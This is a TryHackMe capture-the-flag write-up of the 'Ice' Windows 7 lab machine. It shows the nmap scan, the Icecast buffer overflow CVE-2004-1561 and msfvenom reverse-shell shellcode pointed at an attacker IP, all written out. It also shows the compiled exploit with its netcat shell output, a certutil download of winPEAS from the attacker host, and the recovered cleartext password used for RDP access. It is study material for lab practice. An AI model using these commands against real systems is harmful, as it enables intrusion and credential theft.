# ICE - TryHackMe

> **Kill Chain Summary**:
> Network Port Scanning (Ports 135, 139, 445, 3389, 8000) -> Icecast 2.0.1 Streaming Server Identification -> Buffer Overflow Vulnerability (CVE-2004-1561) -> Custom x86 Shellcode Generation via msfvenom -> C Exploit Compilation -> Reverse Shell Execution as `Dark` -> Local Enumeration via winPEAS -> Cleartext Credential Recovery (`Dark:Password01!`) -> System Escalation and RDP Access.

| Property | Value |
| :--- | :--- |
| **Target Name** | ICE |
| **Platform** | TryHackMe |
| **OS** | Windows 7 Professional SP1 |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Icecast Buffer Overflow (CVE-2004-1561), msfvenom Shellcode Replacement, winPEAS Credential Discovery |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.150.80 10.10.150.80
```

**Open Ports:**

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 135/tcp | MSRPC | Microsoft Windows RPC | Standard Windows management |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS session service |
| 445/tcp | microsoft-ds | Windows 7 Professional SP1 | SMB service (Access denied) |
| 3389/tcp | RDP | Microsoft Terminal Services | Remote Desktop protocol |
| 5357/tcp | HTTP | Microsoft HTTPAPI 2.0 | WSDAPI / UPnP service |
| 8000/tcp | HTTP | Icecast streaming media server | Primary attack surface |

### 1.2 SMB Enumeration (Port 445)

Standard SMB enumeration with `enum4linux` and `smbclient` confirmed that anonymous access was disabled (`NT_STATUS_ACCESS_DENIED`), directing focus toward the web streaming service on port 8000.

---

## 2. Initial Access

### 2.1 Vulnerability Discovery: Icecast Buffer Overflow (CVE-2004-1561)

Accessing port 8000 displays an Icecast streaming media server. Searching for public exploits targeting Icecast:

```bash
searchsploit Icecast
```

```text
Icecast 2.0.1 (Win32) - Remote Code Execution | windows/remote/568.c
```

> [!NOTE] Concept: CVE-2004-1561 (Icecast Header Buffer Overflow)
> Icecast versions 2.0.1 and prior contain a buffer overflow vulnerability in how HTTP request headers are parsed. When the server receives an overly long header string, it overwrites the instruction pointer (`EIP`), allowing remote code execution under the context of the user running the service.

### 2.2 Shellcode Generation and Exploit Compilation

Rather than using Metasploit, the standalone C exploit `568.c` was customized with modern shellcode.

#### Step 1: Generate x86 Reverse Shell Shellcode
Windows 7 32-bit and the 32-bit Icecast binary require x86 shellcode. Generate raw C shellcode avoiding common bad characters (`\x00`, `\x0a`, `\x0d`):

```bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=443 \
  -b '\x0a\x0d\x00' \
  -f c
```

#### Step 2: Update Exploit Source Code
Replace the default shellcode buffer inside `568.c` with the newly generated payload:

```bash
cp /usr/share/exploitdb/exploits/windows/remote/568.c exploit.c
nano exploit.c
```

Compile the exploit using `gcc`:

```bash
gcc exploit.c -o icecast_exploit
chmod +x icecast_exploit
```

#### Step 3: Trigger the Exploit
Start a Netcat listener on port 443:

```bash
sudo nc -lvnp 443
```

Execute the compiled exploit against the target:

```bash
./icecast_exploit 10.10.150.80
```

```text
[+] Connecting to 10.10.150.80:8000...
[+] Server IS vulnerable!
[+] Sending exploit payload...
```

The listener catches the reverse shell:

```text
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.150.80] 49201
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32> whoami
dark-pc\dark
```

Retrieve the user flag:

```cmd
type C:\Users\Dark\Desktop\user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration via winPEAS

Transfer `winPEASx64.exe` to the target host using `certutil`:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/winPEASx64.exe C:\Temp\winpeas.exe
C:\Temp\winpeas.exe
```

Reviewing the winPEAS enumeration output identified stored cleartext credentials for the local user `Dark`:
- **Username:** `Dark`
- **Password:** `Password01!`

Checking group memberships confirms that user `Dark` is a member of the local **Administrators** group:

```cmd
net user Dark
```

```text
User name                    Dark
Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

### 3.2 Administrative Session via RDP

To authenticate administratively using Remote Desktop, invoke `xfreerdp`. When connecting to legacy Windows 7 hosts from modern Linux systems, specify legacy TLS compatibility flags (`/tls-seclevel:0 /sec:rdp`) to prevent TLS handshake failures:

```bash
xfreerdp /v:10.10.150.80 /u:Dark /p:'Password01!' /tls-seclevel:0 /sec:rdp +clipboard
```

Alternatively, spawn an elevated process using PowerShell credentials or RunAs:

```powershell
$password = ConvertTo-SecureString "Password01!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("dark-pc\Dark", $password)
Start-Process cmd.exe -Credential $cred -ArgumentList "/c type C:\Users\Administrator\Desktop\root.txt > C:\Temp\root.txt"
```

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Generate Windows x86 Shellcode in C Format
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -b '\x0a\x0d\x00' -f c

# Compile C Exploit on Linux
gcc exploit.c -o exploit && chmod +x exploit

# Windows Native Binary Download via certutil
certutil -urlcache -split -f http://<KALI_IP>:<PORT>/binary.exe C:\Temp\binary.exe

# Legacy RDP Connection Bypassing Modern TLS Handshake Requirements
xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASSWORD>' /tls-seclevel:0 /sec:rdp +clipboard
```

---

## 5. Key Takeaways and Lessons Learned

1. **Custom Shellcode Replacement:** Legacy public exploits in C often contain outdated or hardcoded shellcode. Extracting clean C-format payloads using `msfvenom` and recompiling allows reliable, non-Metasploit exploitation.
2. **Architecture and Bad Characters:** 32-bit services on 64-bit Windows architectures require 32-bit payloads (`-a x86`). Omitting common string terminators (`\x00`, `\x0a`, `\x0d`) ensures payloads survive network protocol transmission intact.
3. **Legacy Protocol Troubleshooting:** When authentication against legacy operating systems (like Windows 7 RDP) fails with handshake or cipher negotiation errors, investigate TLS security levels before concluding that credentials are invalid.

---

#tryhackme #windows #easy #icecast #buffer-overflow #cve-2004-1561 #msfvenom #shellcode #winpeas #rdp #privesc